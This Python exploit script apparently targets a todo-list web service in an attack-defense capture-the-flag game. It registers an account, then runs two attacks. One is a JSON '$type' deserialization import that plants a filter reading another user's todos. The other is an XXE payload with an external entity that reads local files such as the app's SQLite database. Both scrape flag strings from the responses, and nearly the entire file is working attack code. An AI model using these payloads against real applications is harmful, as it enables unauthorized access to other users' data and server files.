import io
import json
import logging
import random
import re
import string
import sys

import requests
from bs4 import BeautifulSoup


def extract_verification_token(html_content: str):
    soup = BeautifulSoup(html_content, "html.parser")
    return soup.find("input", {"name": "__RequestVerificationToken"})["value"]


class Exploit:

    def __init__(self, host: str, port: int):
        self.host = host
        self.email = f'hansi@web1.de'
        self.password = f"Hansi@web1.de"
        self.web_app_port = port
        self.base_url = f'http://[{self.host}]:{self.web_app_port}/'
        self.register_url = self.base_url + 'Identity/Account/Register'
        self.login_url = self.base_url + 'Identity/Account/Login'
        self.list_todos_url = self.base_url + 'Todo/ListTodos'
        self.add_todo_url = self.base_url + 'Todo/AddTodo'
        self.import_url = self.base_url + 'Todo/Import'
        self.export_url = self.base_url + 'Todo/Export'
        self.add_filter_url = self.base_url + "Todo/AddFilter"
        self.apply_filter_url = self.base_url + "Todo/ApplyFilter"
        self.logout_url = self.base_url + 'Identity/Account/Logout'
        self.session = requests.Session()
        self.register()
        self.login()

    def register(self):
        r = self.session.get(self.register_url)
        data = {"Input.Email": self.email,
                "Input.Password": self.password,
                "Input.ConfirmPassword": self.password,
                "__RequestVerificationToken": extract_verification_token(r.text)}
        r2 = self.session.post(self.register_url, data=data)
        if "is already taken." in r2.text:
            logging.info(f"{self.email} already taken")
            pass
        if r2.status_code != 200 or r2.status_code != 200:
            logging.error("Could not register")
            exit()

    def login(self):
        r = self.session.get(self.login_url)
        data = {"Input.Email": self.email,
                "Input.Password": self.password,
                "__RequestVerificationToken": extract_verification_token(r.text),
                "Input.RememberMe": "True"}
        r2 = self.session.post(self.login_url, data=data)
        if "Invalid login attempt." in r2.text:
            logging.error(f"{self.email} {self.password}   :   invalid login attempt")
            exit()
        if r.status_code != 200 or r2.status_code != 200:
            logging.error("Could not login")
            exit()

    def run_json_exploit(self, victim):
        characters = string.ascii_letters + string.digits
        filter_name = ''.join(random.choice(characters) for i in range(10))
        payload = {
            "$type": "service.Models.Filter, service",
            "Name": filter_name,
            "User": self.email,
            "QueryString": "{'Category': '', 'User': '" + victim + "', 'FromTime': '-1', 'ToTime': '-1'}"
        }
        files = {"file": json.dumps(payload)}
        res = self.session.post(self.import_url, files=files)
        params = {
            "name": filter_name
        }
        res = self.session.get(self.apply_filter_url, params=params)
        pattern = r"FAUST_[A-Za-z0-9]+|FLAG_[A-Za-z0-9]+"
        matches = re.findall(pattern, res.text)
        print(matches)

    def run_xml_exploit(self, file):
        payload = f"""<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE ArrayOfTodoItem [
        <!ENTITY myExternalEntity SYSTEM "file://{file}">
        ]>
<ArrayOfTodoItem xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <TodoItem>
        <Id>5</Id>
        <Description>&myExternalEntity;</Description>
        <IsCompleted>false</IsCompleted>
        <UserId>1582</UserId>
    </TodoItem>
</ArrayOfTodoItem>"""
        xml_file = io.BytesIO()
        xml_file.write(payload.encode())
        self.session.post(self.import_url, files=xml_file)
        res = self.session.get(self.list_todos_url)
        pattern = r"FLAG_\{[A-Za-z0-9]+\}"
        matches = re.findall(pattern, res.text)
        print(matches)

if __name__ == '__main__':
    exploit = Exploit(sys.argv[1], 8080)
    # exploit.run_xml_exploit("/app/sqlite.db")
    exploit.run_json_exploit("admin@todo-list-service.de")
